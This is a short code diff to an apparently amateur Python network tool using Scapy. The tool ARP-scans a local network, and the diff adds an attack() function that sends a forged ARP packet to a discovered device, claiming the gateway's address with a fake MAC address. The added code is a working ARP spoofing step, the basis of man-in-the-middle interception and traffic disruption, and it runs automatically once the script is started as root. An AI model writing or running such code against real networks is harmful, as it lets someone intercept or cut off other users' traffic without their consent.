@@ -18,6 +18,7 @@ def connected(gateway_address, ip_range):
      broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
      arp_request_broadcast = broadcast/arp_request
      response = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+     global clients
      clients = []
      for client in response:
           client_info = {"ip" : client[1].psrc, "mac" : client[1].src}
@@ -43,8 +44,24 @@ def call_connected():
           print("Adresse IP non prise en charge")
 
 
+def attack():
+     get_gateway_address()
+     if len(clients) > 1:
+          packet = ARP(
+               op=1,
+               pdst = clients[1]["ip"],
+               hwdst = clients[1]["mac"],
+               psrc = gateway_address,
+               hwsrc='12:04:56:78:9a:bc'
+          )
+          send(packet, verbose=False)
+     else:
+          print(colored("No devices to attack", "red"))
+
+
 if __name__ == "__main__":
      if has_root():
           call_connected()
+          attack()
      else:
           print(colored("Run this script with root privileges", "red"))
